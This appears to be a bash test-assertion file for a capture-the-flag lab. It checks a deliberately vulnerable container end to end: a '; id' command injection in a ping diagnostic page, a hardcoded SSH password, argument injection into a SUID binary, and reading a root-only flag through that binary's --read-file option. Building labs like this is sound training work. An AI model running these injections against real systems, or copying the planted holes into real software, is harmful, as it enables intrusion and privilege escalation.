#!/usr/bin/env bash
#
# DIRECTIVE ZERO — AM-KotH exploit-chain test assertions.
#
# Sourced by _test_runner/run_tests.sh. Must define run_am_tests().
# Uses helper functions provided by the runner:
#   assert_port_open, assert_http_contains, assert_ssh_login,
#   assert_ssh_command, assert_flag_matches, pass, fail
#
# Env vars set by the runner:
#   TARGET_HOST, KOTH_FLAG_SECRET
#
# The KoTH container has no static flags — the flag rotates via the
# webhook. Tests verify the exploit chain + webhook + flag rotation.

run_am_tests() {
  local http_port="${TARGET_HTTP_PORT:-80}"
  local ssh_port="${TARGET_SSH_PORT:-22}"
  local webhook_port="${KOTH_WEBHOOK_PORT:-8081}"
  local koth_secret="${KOTH_FLAG_SECRET:-changeme}"

  echo "Stage 1 — service enumeration"
  assert_port_open "$http_port"
  assert_port_open "$ssh_port"

  echo "Stage 2 — web console accessible"
  assert_http_contains "/" "QUORUM CORE"
  assert_http_contains "/diagnostic.php" "Network Connectivity Diagnostic"

  echo "Stage 3 — command injection in diagnostic endpoint"
  # The diagnostic endpoint runs `ping -c 1 -W 1 <host>` — injecting
  # "; id" should return the uid in the output.
  local inject_url="http://${TARGET_HOST}:${http_port}/diagnostic.php?host=127.0.0.1%3B+id"
  local inject_out
  inject_out="$(curl -s "$inject_url" || true)"
  if echo "$inject_out" | grep -q "uid="; then
    pass "command injection works (id output visible)"
  else
    fail "command injection did not produce uid= output"
  fi

  echo "Stage 4 — command injection runs as quorum-svc (low-priv)"
  # Inject "id" and check the uid is quorum-svc (not root)
  local uid_out
  uid_out="$(curl -s "http://${TARGET_HOST}:${http_port}/diagnostic.php?host=127.0.0.1%3B+id" | grep -oE "uid=[0-9]+\(quorum-svc\)" || true)"
  if [[ -n "$uid_out" ]]; then
    pass "web service runs as quorum-svc: $uid_out"
  else
    fail "web service does not run as quorum-svc (expected uid=...(quorum-svc))"
  fi

  echo "Stage 5 — SSH access as quorum-svc"
  assert_ssh_login "quorum-svc" "qu0rum_c0re_2026"

  echo "Stage 6 — SUID quorum-diag binary exists and is SUID root"
  local suid_check
  suid_check="$(sshpass -p "qu0rum_c0re_2026" ssh -p "$ssh_port" \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
    "quorum-svc@${TARGET_HOST}" 'ls -la /usr/local/bin/quorum-diag' 2>/dev/null || true)"
  if echo "$suid_check" | grep -q "rwsr-xr-x"; then
    pass "quorum-diag is SUID root: $(echo "$suid_check" | awk '{print $1, $3, $9}')"
  else
    fail "quorum-diag is not SUID root (got: $suid_check)"
  fi

  echo "Stage 7 — SUID arg injection runs commands (as quorum-svc)"
  # quorum-diag --status "; id" runs id via system() — but system() drops
  # SUID, so this runs as quorum-svc, not root. This confirms the arg
  # injection vuln exists (useful for recon, but not the privesc path).
  local inject_out
  inject_out="$(sshpass -p "qu0rum_c0re_2026" ssh -p "$ssh_port" \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
    "quorum-svc@${TARGET_HOST}" '/usr/local/bin/quorum-diag --status "; id"' 2>/dev/null || true)"
  if echo "$inject_out" | grep -q "uid="; then
    pass "arg injection runs commands (as quorum-svc, not root — SUID dropped by system())"
  else
    fail "arg injection did not produce uid= output (got: $inject_out)"
  fi

  echo "Stage 8 — SUID --read-file reads root-only flag (privesc)"
  # The --read-file option reads a file directly using the SUID root
  # privilege (open/read in the C code, not system()). This is the
  # actual privesc primitive — players use it to read /root/koth_flag.txt.
  local flag_via_privesc
  flag_via_privesc="$(sshpass -p "qu0rum_c0re_2026" ssh -p "$ssh_port" \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
    "quorum-svc@${TARGET_HOST}" '/usr/local/bin/quorum-diag --read-file /root/koth_flag.txt' 2>/dev/null || true)"
  local flag_value
  flag_value="$(echo "$flag_via_privesc" | grep -oE "DZ\{[^}]+\}" | head -1 || true)"
  if [[ -n "$flag_value" ]]; then
    pass "flag read via SUID --read-file: $flag_value"
  else
    fail "could not read flag via SUID --read-file (got: $flag_via_privesc)"
  fi

  echo "Stage 9 — flag file is root-only (quorum-svc cannot read directly)"
  # quorum-svc can't traverse /root/ (directory is 0700 root), so we
  # verify permissions indirectly: the SUID --read-file can read it
  # (proving root privilege), but a direct cat fails (proving it's
  # root-only). We also check the file exists via the webhook's
  # GET /internal/flag endpoint.
  local flag_via_webhook
  flag_via_webhook="$(curl -s -H "X-Koth-Secret: $koth_secret" \
    "http://${TARGET_HOST}:${webhook_port}/internal/flag" 2>/dev/null || true)"
  if echo "$flag_via_webhook" | grep -q "DZ{"; then
    pass "flag file exists and is readable via webhook (root-only service)"
  else
    fail "flag file not accessible via webhook (got: $flag_via_webhook)"
  fi
  local direct_read
  direct_read="$(sshpass -p "qu0rum_c0re_2026" ssh -p "$ssh_port" \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
    "quorum-svc@${TARGET_HOST}" 'cat /root/koth_flag.txt 2>&1' 2>/dev/null || true)"
  if echo "$direct_read" | grep -q "Permission denied"; then
    pass "quorum-svc cannot read flag directly (Permission denied)"
  else
    fail "quorum-svc can read flag directly (should be root-only): $direct_read"
  fi

  echo "Stage 10 — flag webhook service works (rotation)"
  # POST a new flag to the webhook endpoint and verify it updates
  local new_flag="DZ{koth_test_rotated_$(date +%s)}"
  local webhook_resp
  webhook_resp="$(curl -s -X POST \
    -H "Content-Type: application/json" \
    -H "X-Koth-Secret: $koth_secret" \
    -d "{\"flag\": \"$new_flag\"}" \
    "http://${TARGET_HOST}:${webhook_port}/internal/flag-update" 2>/dev/null || true)"
  if echo "$webhook_resp" | grep -q "flag updated"; then
    pass "webhook accepted new flag: $new_flag"
  else
    fail "webhook did not accept new flag (got: $webhook_resp)"
  fi

  echo "Stage 11 — flag rotation confirmed (read new flag via SUID)"
  # Read the flag again via --read-file — it should now be the rotated value
  local flag_after_rotation
  flag_after_rotation="$(sshpass -p "qu0rum_c0re_2026" ssh -p "$ssh_port" \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
    "quorum-svc@${TARGET_HOST}" '/usr/local/bin/quorum-diag --read-file /root/koth_flag.txt' 2>/dev/null || true)"
  local rotated_value
  rotated_value="$(echo "$flag_after_rotation" | grep -oE "DZ\{[^}]+\}" | head -1 || true)"
  if [[ "$rotated_value" == "$new_flag" ]]; then
    pass "flag rotation confirmed: $rotated_value"
  else
    fail "flag rotation failed (expected $new_flag, got $rotated_value)"
  fi

  echo "Stage 12 — webhook rejects unauthorized requests"
  local bad_secret_resp
  bad_secret_resp="$(curl -s -o /dev/null -w '%{http_code}' -X POST \
    -H "Content-Type: application/json" \
    -H "X-Koth-Secret: wrong-secret" \
    -d '{"flag": "DZ{fake}"}' \
    "http://${TARGET_HOST}:${webhook_port}/internal/flag-update" 2>/dev/null || true)"
  if [[ "$bad_secret_resp" == "403" ]]; then
    pass "webhook rejects unauthorized secret (403)"
  else
    fail "webhook accepted wrong secret (got HTTP $bad_secret_resp, expected 403)"
  fi

  echo "Stage 13 — webhook health endpoint"
  local health_resp
  health_resp="$(curl -s "http://${TARGET_HOST}:${webhook_port}/internal/health" 2>/dev/null || true)"
  if echo "$health_resp" | grep -q "ok"; then
    pass "webhook health endpoint responds OK"
  else
    fail "webhook health endpoint did not respond OK (got: $health_resp)"
  fi
}